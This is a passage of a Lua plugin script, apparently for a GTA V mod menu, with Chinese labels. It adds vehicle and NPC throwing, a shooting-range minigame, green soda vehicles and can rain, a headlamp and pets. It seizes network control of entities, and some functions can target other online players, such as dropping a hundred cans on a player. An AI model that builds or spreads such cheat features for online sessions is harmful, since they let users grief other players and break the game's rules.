        entities.delete_by_handle(c10)
        entities.delete_by_handle(c11)
        entities.delete_by_handle(c12)
        entities.delete_by_handle(c13)
        entities.delete_by_handle(c14)
        entities.delete_by_handle(c15)
        entities.delete_by_handle(c16)
        entities.delete_by_handle(c17)
        entities.delete_by_handle(c18)
        entities.delete_by_handle(c19)     
    end
end
        menu.toggle(fun,  "保护球", {}, "", function(on)
            Protect_ball(on)
        end)
        --------抛掷载具
function get_closest_veh(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, veh in pairs(entities.get_all_vehicles_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(veh))
        if this_dist < closest_dist  and ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
            closest = veh
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
function request_control_of_entity_once(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
    end
end
local entity_held = 0
local are_hands_up = false
local ped_held = 0
function throwvehs()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true)  then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_veh(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local veh = closest[1]
                if veh ~= nil then 
                    local dist = closest[2]
                    if dist <= 5 then 
                        request_anim_dict("missminuteman_1ig_2")
                        TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                        util.yield(500)
                        are_hands_up = true
                        ENTITY.SET_ENTITY_ALPHA(veh, 100)
                        ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        request_control_of_entity_once(veh)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, players.user_ped(), 0, 0, 0, get_model_size(ENTITY.GET_ENTITY_MODEL(veh)).z / 2, 180, 180, -180, true, false, true, false, 0, true)
                        entity_held = veh
                    end 
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_VEHICLE(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity_held, 100.0)
                VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(entity_held, true, true)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
        end
    end
end
        menu.toggle(fun, "抛掷载具", {}, "在载具附近按E将载具抬起来,在按E将载具投掷出去.", function(on)
            throwvehs()
        end)
        ------抛掷NPC
function get_closest_ped_new(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped)  and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
function throwpeds()
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_ped_new(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                if closest ~= nil then
                    local ped = closest[1]
                    if ped ~= nil then
                        local dist = closest[2]
                        if dist <= 5 then 
                            request_anim_dict("missminuteman_1ig_2")
                            TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                            util.yield(500)
                            are_hands_up = true
                            ENTITY.SET_ENTITY_ALPHA(ped, 100)
                            ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                            request_control_of_entity_once(ped)
                            ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, players.user_ped(), 0, 0, 0, 1.3, 180, 180, -180, true, false, true, true, 0, true)
                            entity_held = ped
                        end 
                    end
                end
            else
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                are_hands_up = false
            end
        else
            if ENTITY.IS_ENTITY_A_PED(entity_held) then
                ENTITY.DETACH_ENTITY(entity_held)
                ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                PED.SET_PED_TO_RAGDOLL(entity_held, 10, 10, 0, false, false, false)
                --ENTITY.SET_ENTITY_VELOCITY(entity_held, 0, 100, 0)
                ENTITY.SET_ENTITY_MAX_SPEED(entity_held, 100.0)
                ENTITY.APPLY_FORCE_TO_ENTITY(entity_held, 1, 0, 100, 0, 0, 0, 0, 0, true, false, true, false, false)
                AUDIO.PLAY_PAIN(entity_held, 7, 0, 0)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, players.user_ped(), false)
                request_anim_dict("melee@unarmed@streamed_core")
                TASK.TASK_PLAY_ANIM(players.user_ped(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                util.yield(500)
                ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
                entity_held = 0
                are_hands_up = false
            end
        end
    end
end
        menu.toggle(fun,"抛掷NPC", {}, "在NPC附近按E将NPC抬起来,在按E将NPC投掷出去.", function(on)
            throwpeds()
        end)
        ------------射击馆
shoot_text_colour = {
    r = 1.0,
    g = 1.0,
    b = 1.0,
    a = 1.0
}
shoot_bg_colour = {
    r = 0.75,
    g = 0.82,
    b = 0.94,
    a = 1
}
shoot_pos = {
    x = -2983.3865,
    y = -5147.500,
    z = 437.15488
}
time_selector ={
    display_options = {"无限制", "30s", "60s", "90s", "120s", "180s", "300s"},
    value = { 0, 30000, 60000, 90000, 120000, 180000, 300000}
}
local max_height = 5
simple3d_target_max_height = {
    display_options = {"地面", "低", "中", "高", "巅峰"},
    height_value = {0, 3, 5, 7, 9}
}
local ped_health = 200
ped_health_selector = {
    display_options = {"NPC", "Player", "一枪击杀", "仅爆头[狙击手MKII]"},
    healh_values = {200, 328, 105, 100000}
}
function clear_all_peds()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
            entities.delete_by_handle(ped)
            util.yield()
        end
    end
end
function clear_dead_peds()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and ENTITY.IS_ENTITY_DEAD(ped) then
            entities.delete_by_handle(ped)
        end               
    end
end
function create_ped_simple_3d(max_height, health)
    if max_height ~= 0 then
        zrandom = math.random(0, max_height)
    else
        zrandom = 0
    end
    xrandom, yrandom = math.random(0, 63), math.random(0, 82)
    target_ped = PED.CREATE_RANDOM_PED(-2951.51345-xrandom, -5188.895345+yrandom, 437.353345+zrandom)
    ENTITY.SET_ENTITY_HEALTH(target_ped, health, 0)
    ENTITY.FREEZE_ENTITY_POSITION(target_ped, true)
    return target_ped
end
function create_ped_simple_2d(health)
    xrandom, yrandom, zrandom = math.random(0, 63), 0, math.random(0, 10)
    target_ped = PED.CREATE_RANDOM_PED(-2951.51345-xrandom, -5188.895345+yrandom, 437.353345+zrandom)
    ENTITY.SET_ENTITY_HEALTH(target_ped, health, 0)
    ENTITY.FREEZE_ENTITY_POSITION(target_ped, true)
    return target_ped
end
function teleport_to_lab()
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), shoot_pos.x, shoot_pos.y+20, shoot_pos.z + 2, 0, 0, 1)
end
function toint(n)
    local s = tostring(n)
    local i, j = s:find('%.')
    if i then
        return tonumber(s:sub(1, i-1))
    else
        return n
    end
end
function end_minigame(minigame)
    minigame:trigger(false)
    util.yield(1000)
    clear_all_peds() 
end
---------创建训练场
objects = {}
function load_lab()
    objects = {}
    prop_hash = util.joaat("stt_prop_stunt_bblock_huge_03")
    ped_shoot_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    STREAMING.REQUEST_MODEL(prop_hash)
	
    local object = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y, shoot_pos.z, true, true, false)
    objects[#objects + 1] = object
    local object = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y, shoot_pos.z+ 15, true, true, false)
    objects[#objects + 1] = object
    local object = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y+42, shoot_pos.z-2.6, true, true, false)
    objects[#objects + 1] = object
    local object = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x, shoot_pos.y-42, shoot_pos.z-2.6, true, true, false)
    objects[#objects + 1] = object
    local object = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x -32.5, shoot_pos.y, shoot_pos.z, true, true, false)
    objects[#objects + 1] = object
    local object = OBJECT.CREATE_OBJECT_NO_OFFSET(prop_hash, shoot_pos.x +32.5, shoot_pos.y, shoot_pos.z, true, true, false)
    objects[#objects + 1] = object
    util.yield(50)
    rot = ENTITY.GET_ENTITY_ROTATION(objects[3])
    rot.x = 90
	ENTITY.SET_ENTITY_ROTATION(objects[3], rot.x,rot.y,rot.z,1,true)
    rot = ENTITY.GET_ENTITY_ROTATION(objects[4])
    rot.x = 90
	ENTITY.SET_ENTITY_ROTATION(objects[4], rot.x,rot.y,rot.z,1,true)
    rot = ENTITY.GET_ENTITY_ROTATION(objects[5])
    rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(objects[5], rot.x,rot.y,rot.z,1,true)
    rot = ENTITY.GET_ENTITY_ROTATION(objects[6])
    rot.y = -90
	ENTITY.SET_ENTITY_ROTATION(objects[6], rot.x,rot.y,rot.z,1,true)
    util.yield(500)
    teleport_to_lab()
    clear_all_peds()
end
----结束
function Clean_training_ground()
    TELEPORT(-1314, -3057, 13)
    util.yield(500)
        for _, ped in ipairs(entities.get_all_peds_as_handles()) do
            if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
                entities.delete_by_handle(ped)
            end
        end
        for key, value in pairs(objects) do
            entities.delete_by_handle(value)
        end
end
--------3D射击
ped_health_3d = ped_health
local time_3d = 0
function Shooting_simulation_3D(toggle)
    on = toggle
    ped_health_3d = ped_health_3d
    simple_3d_started = true
    simple_2d_toggle:trigger(false)
    time = time_3d
    menu.trigger_commands("time 11; locktime on")
    util.yield(1000)
    clear_all_peds()
    util.yield(100)
    local target_ped = create_ped_simple_3d(max_height, ped_health_3d)
    HUD.ADD_BLIP_FOR_ENTITY(target_ped)
    local kills = 0
    local end_time = util.current_time_millis() + time
    while on do 
        TASK.TASK_STAND_STILL(target_ped, 1000000)
        -----DRAW INFO BOX
        local cur_time = util.current_time_millis()
        local timer = ((end_time - cur_time)/1000)
        if time > 0 then
            txt = ("得分: "..kills.." | 时间: "..toint(timer))
        else
            txt = ("得分: "..kills.." | 时间: ∞")
        end
        local size_x, size_y = directx.get_text_size((txt), 0.7)
        local shoot_pos_x = (0.5 - size_x/2)
        local shoot_pos_y = 0.015
        directx.draw_rect(shoot_pos_x - 0.01, shoot_pos_y - 0.01, size_x + 0.02, size_y + 0.02, shoot_bg_colour)
        directx.draw_text(shoot_pos_x, shoot_pos_y, txt, 0, 0.70, shoot_text_colour, true ) 
        if timer <= 0 and time > 0 then
            util.toast("3D射击已经结束 | 得分: "..kills.." | 时间: "..toint(time/1000).."s.")
            simple_3d_started = false
            end_minigame(simple_3d_toggle)
        end
        ------TARGET HANDLER
        if ENTITY.IS_ENTITY_DEAD(target_ped) then
            clear_dead_peds()
            if timer > 0 or time == 0 then
                kills = kills + 1
                target_ped = create_ped_simple_3d(max_height, ped_health_3d)
                HUD.ADD_BLIP_FOR_ENTITY(target_ped)
            end
        end
        util.yield()
    end
    if not on then 
        clear_all_peds()
        simple_3d_started = false
    end
end
function Set_condition_3D(index)
    ped_health_3d = ped_health_selector.healh_values[index]
    if simple_3d_started then
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index].."< 更改将应用于下一场比赛")
    else
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index].."<")
    end
end
function Set_shoot_time_3D(index)
    time_3d = time_selector.value[index]
    if simple_3d_started then
        util.toast("修改游戏时间至>"..time_selector.display_options[index].."< 更改将应用于下一场比赛")
    else
        util.toast("修改游戏时间至>"..time_selector.display_options[index].."<")
    end
end
function Target_build_height_3D(index)
    max_height = simple3d_target_max_height.height_value[index]
    if simple_3d_started then
        util.toast("将简单3D生成高度修改为 >"..simple3d_target_max_height.display_options[index].."< 更改将应用于下一场比赛")
    else
        util.toast("将简单3D生成高度修改为 >"..simple3d_target_max_height.display_options[index].."<")
    end
end
--------2D射击
ped_health_2d = ped_health
local time_2d = 0
function Shooting_simulation_2D(toggle)
    on = toggle
    simple_2d_started = true
    simple_3d_toggle:trigger(false)
    time = time_2d
    menu.trigger_commands("time 11; locktime on")
    util.yield(1000)
    clear_all_peds()
    util.yield(100)
    local target_ped = create_ped_simple_2d(ped_health_2d)
    HUD.ADD_BLIP_FOR_ENTITY(target_ped)
    local kills = 0
    local end_time = util.current_time_millis() + time
    while on do 
        TASK.TASK_STAND_STILL(target_ped, 1000000)
        -----DRAW INFO BOX
        local cur_time = util.current_time_millis()
        local timer = ((end_time - cur_time)/1000)
        if time > 0 then
            txt = ("得分: "..kills.." | 时间: "..toint(timer))
        else
            txt = ("得分: "..kills.." | 时间: ∞")
        end
        local size_x, size_y = directx.get_text_size((txt), 0.7)
        local shoot_pos_x = (0.5 - size_x/2)
        local shoot_pos_y = 0.015
        directx.draw_rect(shoot_pos_x - 0.01, shoot_pos_y - 0.01, size_x + 0.02, size_y + 0.02, shoot_bg_colour)
        directx.draw_text(shoot_pos_x, shoot_pos_y, txt, 0, 0.70, shoot_text_colour, true ) 
        if timer <= 0 and time > 0 then
            util.toast("2D射击已经结束 | 得分: "..kills.." | 时间: "..toint(time/1000).."s.")
            simple_2d_started = false
            end_minigame(simple_2d_toggle)
        end
        ------TARGET HANDLER
        if ENTITY.IS_ENTITY_DEAD(target_ped) then
            clear_dead_peds()
            if timer > 0 or time == 0 then
                kills = kills + 1
                target_ped = create_ped_simple_2d(ped_health_2d)
                HUD.ADD_BLIP_FOR_ENTITY(target_ped)
            end
        end
        util.yield()
    end
    if not on then 
        simple_2d_started = false
        clear_all_peds()
    end
end
function Set_condition_2D(index)
    ped_health_2d = ped_health_selector.healh_values[index]
    if simple_2d_started then
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index].."<更改将在下一场比赛中应用")
    else
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index].."<")
    end
end
function Set_shoot_time_2D(index)
    time_2d = time_selector.value[index]
    if simple_2d_started then
        util.toast("修改游戏时间至>"..time_selector.display_options[index].."< 更改将在下一场比赛中应用。")
    else
        util.toast("修改游戏时间至>"..time_selector.display_options[index].."<")
    end
end
        Shooting_practice = menu.list(fun, "射击馆")
    menu.divider(Shooting_practice,"射击训练场")
    create_lab = menu.action(Shooting_practice,"创建训练场", {}, "", function()
        load_lab()
    end)
    menu.action(Shooting_practice,"传送到训练场", {}, "", function()
        teleport_to_lab()
        clear_all_peds()
    end)
    menu.action(Shooting_practice,"结束训练", {}, "", function()
        Clean_training_ground()
    end)

    menu.divider(Shooting_practice,"射击类型")
    simple_3d = menu.list(Shooting_practice,"3D射击", {}, "")
        menu.divider(simple_3d,"3D射击")
        simple_3d_toggle = menu.toggle(simple_3d,"开始", {}, "", function(toggle)
            Shooting_simulation_3D(toggle)
        end)
        menu.divider(simple_3d,"游戏设置")
        menu.list_action(simple_3d,"设定状况", {}, "", ped_health_selector.display_options, function(index)
            Set_condition_3D(index)
        end)
        menu.list_action(simple_3d,"游戏时间", {}, "", time_selector.display_options, function(index)
            Set_shoot_time_3D(index)
        end)
        menu.list_action(simple_3d,"目标最大生成高度", {}, "", simple3d_target_max_height.display_options, function(index)
            Target_build_height_3D(index)
        end)

    simple_2d = Shooting_practice:list("2D射击", {}, "")
        menu.divider(simple_2d,"2D射击")
        simple_2d_toggle = menu.toggle(simple_2d,"开始", {}, "", function(toggle)
            Shooting_simulation_2D(toggle)
        end)
        menu.divider(simple_2d,"游戏设置")
        menu.list_action(simple_2d,"设定状况", {}, "", ped_health_selector.display_options, function(index)
            Set_condition_2D(index)
        end)
        menu.list_action(simple_2d,"游戏时间", {}, "", time_selector.display_options, function(index)
            Set_shoot_time_2D(index)
        end)
        ------绿汽水
sprunk_vehicles = {
    {
        model="thrax",
        livery=8,
    },
    {
        model="tezeract",
        livery=2,
    },
    {
        model="nero2",
        livery=6
    },
    {
        model="champion",
        livery=9
    },
    {
        model="jugular",
        livery=7
    },
    {
        model="buffalo3",
        livery=-1
    },
    {
        model="gb200",
        livery=9
    },
    {
        model="paragon",
        livery=6
    },
    {
        model="issi7",
        livery=6
    },
    {
        model="imorgon",
        livery=4
    },
    {
        model="zr350",
        livery=6
    },
    {
        model="euros",
        livery=13
    },
    {
        model="brioso",
        livery=1
    },
    {
        model="asbo",
        livery=5
    },
    {
        model="faction3",
        livery=5
    },
    {
        model="buffalo4",
        livery=6
    },
    {
        model="novak",
        livery=6
    },
    {
        model="sanchez",
        livery=-1,
        type="motorcycle",
    },
    {
        model="bf400",
        livery=1,
        type="motorcycle",
    },
    {
        model="bati2",
        livery=3,
        type="motorcycle",
    },
    {
        model="reever",
        livery=9,
        type="motorcycle",
    },
    {
        model="formula",
        livery=1
    },
    {
        model="openwheel1",
        livery=7
    },
    {
        model="veto2",
        livery=0,
        type="gokart",
    },
    {
        model="pony",
        livery=2,
        type="van",
    },
    {
        model="stunt",
        livery=2,
        type="plane",
    },
    {
        model="alphaz1",
        livery=5,
        type="plane",
    },
    {
        model="microlight",
        livery=4,
        type="plane",
    },
    {
        model="havok",
        livery=2,
        type="helicopter",
    },
    {
        model="starling",
        livery=7,
        type="plane",
    },
    {
        model="blimp3",
        livery=4,
        type="blimp",
        is_random_spawn=false
    },
}
        ------绿汽水
spawned_objects = {}
random_spawn_vehicles = {}

for _, sprunk_vehicle in pairs(sprunk_vehicles) do
    if sprunk_vehicle.is_random_spawn ~= false then
        table.insert(random_spawn_vehicles, sprunk_vehicle)
    end
end

function load_hash(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end
function spawn_object_at_pos(pos, model, ttl)
    local pickup_hash = util.joaat(model)
    load_hash(pickup_hash)
    local pickup_pos = v3.new(pos.x, pos.y, pos.z)
    local pickup = entities.create_object(pickup_hash, pickup_pos)
    ENTITY.SET_ENTITY_COLLISION(pickup, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(
        pickup, 5, 0, 0, 1,
        true, false, true, true
    )
    table.insert(spawned_objects, { handle=pickup, spawn_time=util.current_time_millis(), ttl=ttl})
end
function nearby_position(pos, range)
    if range == nil then
        range = {
            x_max=1, y_max=1, z_max=1,
            x_min=-1, y_min=-1, z_min=0,
        }
    end
    return {
        x=pos.x + math.random(range.x_min, range.x_max),
        y=pos.y + math.random(range.y_min, range.y_max),
        z=pos.z + math.random(range.z_min, range.z_max),
    }
end
function sprunk_can_drop(position, range, model, ttl)
    local spawn_position = position
    if range then
        spawn_position = nearby_position(position, range)
    end
    if model == nil then
        model = "ng_proc_sodacan_01b"
    end
    spawn_object_at_pos(spawn_position, model, ttl)
end
function get_rain_range()
    return {
        x_max=3, y_max=3, z_max=4,
        x_min=3 * -1, y_min=3 * -1, z_min=4,
    }
end
function sprunk_drop_player(pid, range)
    sprunk_can_drop(players.get_position(pid), range)
end
function sprunk_raindrop_player(pid)
    sprunk_drop_player(pid, get_rain_range())
end
function spawn_vehicle_for_player(pid, model_name)
    local model = util.joaat(model_name)
    if not STREAMING.IS_MODEL_VALID(model) or not STREAMING.IS_MODEL_A_VEHICLE(model) then
        -- util.toast("Error: Invalid vehicle name")
        return
    else
        load_hash(model)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 0.0, 4.0, 0.5)
        local heading = ENTITY.GET_ENTITY_HEADING(target_ped)
        local vehicle = entities.create_vehicle(model, pos, heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(model)
        return vehicle
    end
end
function vehicle_set_mod_max_value(vehicle, vehicle_mod)
    local max = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, vehicle_mod) - 1
    VEHICLE.SET_VEHICLE_MOD(vehicle, vehicle_mod, max)
end
function vehicle_mods_set_max_performance(vehicle)
    vehicle_set_mod_max_value(vehicle, 11)
    vehicle_set_mod_max_value(vehicle, 13)
    vehicle_set_mod_max_value(vehicle, 12)
    vehicle_set_mod_max_value(vehicle, 16)
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, true)
end
function sprunkify_vehicle(vehicle)
    vehicle_mods_set_max_performance(vehicle)
    local color = {r=0, g=255, b=0}
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, color.r, color.g, color.b)
    VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, 0, 0, 0)
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, color.r, color.g, color.b)
    VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, 0, 0, 0)
    VEHICLE1._SET_VEHICLE_INTERIOR_COLOR(vehicle, 55)
    VEHICLE1._SET_VEHICLE_DASHBOARD_COLOR(vehicle, 55)
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, true)
    VEHICLE1._SET_VEHICLE_XENON_LIGHTS_COLOR(vehicle, 4)
    VEHICLE1._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, 0, true)
    VEHICLE1._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, 1, true)
    VEHICLE1._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, 2, true)
    VEHICLE1._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, 3, true)
    VEHICLE1._SET_VEHICLE_NEON_LIGHTS_COLOUR(vehicle, color.r, color.g, color.b)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, 0, 55)
    VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, true)
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, 0, 255, 0)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "SPRUNK")
    local target_livery = -1
    local model_hash = entities.get_model_hash(entities.handle_to_pointer(vehicle))
    for _, sprunk_vehicle in pairs(sprunk_vehicles) do
        if sprunk_vehicle.model_hash == model_hash then
            target_livery = sprunk_vehicle.livery
        end
    end
    VEHICLE.SET_VEHICLE_LIVERY(vehicle, target_livery)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 48, target_livery)
end
function sprunk_drop_vehicle(vehicle, range)
    sprunk_can_drop(ENTITY.GET_ENTITY_COORDS(vehicle), range)
end
function sprunk_raindrop_vehicle(vehicle)
    sprunk_drop_vehicle(vehicle, get_rain_range())
end
----绿气传染
local currently_dumping = false
function trash_dump_player(pid)
    if currently_dumping then
        -- Only allow one dump at a time to avoid overloading models
        return
    end
    currently_dumping = true
    local NUM_CANS_TO_DROP = 100
    local num_cans_dropped = 0
    repeat
        local can_models = {
            -- "ng_proc_sodacan_01b",
            "ng_proc_sodacan_02b",
            "ng_proc_sodacan_02d",
            "ng_proc_sodacan_03b"
        }
        sprunk_can_drop(
                players.get_position(pid),
                {
                    x_max=1, y_max=1, z_max=4,
                    x_min=-1, y_min=-1, z_min=2,
                },
                can_models[math.random(1, #can_models)],
                15000
        )
        num_cans_dropped = num_cans_dropped + 1
        util.yield(10)
    until num_cans_dropped >= NUM_CANS_TO_DROP
    currently_dumping = false
end
------绿气传染
function Green_contagion()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pos = ENTITY.GET_ENTITY_COORDS(ped, 1)
    local range = 100
    local nearby_vehicles = entities.get_all_vehicles_as_handles()
    local count = 0
    for _, vehicle in ipairs(nearby_vehicles) do
        local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, 1)
        local distance = SYSTEM.VDIST(pos.x, pos.y, pos.z, vehicle_pos.x, vehicle_pos.y, vehicle_pos.z)
        if distance <= range then
            sprunkify_vehicle(vehicle)
            count = count + 1
        end
    end
    util.toast(count.." 载具染色!")
end


        Green_soda = menu.list(fun, "绿汽水")
    menu.action(Green_soda, "汽水罐", {}, "在你附近掉落一罐汽水", function()
        sprunk_can_drop(players.get_position(players.user()))
    end)
    menu.toggle_loop(Green_soda, "汽水暴雨", {}, "在你附近下起汽水暴雨", function()
        sprunk_raindrop_player(players.user())
        util.yield(100)
    end)
    menu.action(Green_soda, "绿汽水载具", {}, "随机刷一辆绿色的载具（报错不管可正常使用）", function(click_type, pid)
        local sprunk_vehicle = random_spawn_vehicles[math.random(1, #random_spawn_vehicles)]
        local vehicle = spawn_vehicle_for_player(pid, sprunk_vehicle.model)
        if vehicle then
            sprunkify_vehicle(vehicle)
            for i = 1,10,1 do
                sprunk_raindrop_vehicle(vehicle)
            end
        end
    end)

    local headlamp = menu.list(fun, "头灯", {}, "别人看不到的本地娱乐功能.")
    local distance = 25.0
    menu.slider_float(headlamp, "距离", {"distance"}, "光照距离.", 100, 10000, 1500, 100, function(value)
        distance = value / 100
    end)
    
    local brightness = 10.0
    menu.slider_float(headlamp, "亮度", {"brightness"}, "光亮强度.", 100, 10000, 1000, 100, function(value)
        brightness = value / 100
    end)
    
    local radius = 15.0
    menu.slider_float(headlamp, "半径", {"radius"}, "光束半径.", 100, 5000, 2000, 100, function(value)
        radius = value / 100
    end)
    
    local color = {r = 1, g = 235/255, b = 190/255, a = 0}
    menu.colour(headlamp, "颜色", {"colour"}, "", color, true, function(value)
        color = value 
    end)
    
    menu.toggle_loop(headlamp, "开启", {"headlamp"}, "", function()
        local head_pos = PED.GET_PED_BONE_COORDS(players.user_ped(), 31086, 0.0, 0.0, 0.0)
        local cam_rot = players.get_cam_rot(players.user())
        GRAPHICS.DRAW_SPOT_LIGHT(head_pos, cam_rot:toDir(), math.floor(color.r * 255), math.floor(color.g * 255), math.floor(color.b * 255), distance * 1.5, brightness, 0.0, radius, distance)
    end)

local fpets = menu.list(fun, "宠物", {}, "")

menu.toggle_loop(fpets, "狗狗", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_shepherd")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)


menu.toggle_loop(fpets, "哈士奇", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_Husky")
        request_model(pet)
        local pos = players.get_position(players.user())
        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(fpets, "坤坤", {}, "", function()
    if not custom_pet or not ENTITY.DOES_ENTITY_EXIST(custom_pet) then
        local pet = util.joaat("a_c_hen")
        request_model(pet)
        local pos = players.get_position(players.user())
